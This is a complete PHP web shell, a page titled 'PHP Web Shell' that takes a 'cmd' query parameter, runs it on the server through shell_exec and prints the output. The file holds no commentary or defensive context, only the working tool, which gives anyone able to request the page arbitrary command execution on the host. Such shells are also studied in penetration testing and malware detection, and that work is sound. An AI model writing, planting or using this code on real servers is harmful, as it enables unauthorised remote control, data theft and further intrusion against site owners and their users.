<?php
    $parameter = "cmd";
    $output = null;
    if (isset($_SERVER['REQUEST_METHOD']) && strtolower($_SERVER['REQUEST_METHOD']) === 'get' && isset($_GET[$parameter]) && ($_GET[$parameter] = trim($_GET[$parameter])) && strlen($_GET[$parameter]) > 0){
        $output = @shell_exec("($_GET[$parameter]) 2>&1");

        if($output === false){
            $output = 'ERROR: The method might be disabled.';
        }else{
            $output = str_replace('<', '&lt;', $output);
            $output = str_replace('>', '&gt;', $output);
    }
}
?>

<!DOCTYPE html>
<html lang="en">
	<head>
		<title>PHP Web Shell</title>
	</head>
	<body>
		<pre><?php echo $output; unset($output); unset($_GET[$parameter]); ?>
        </pre>
	</body>
</html>
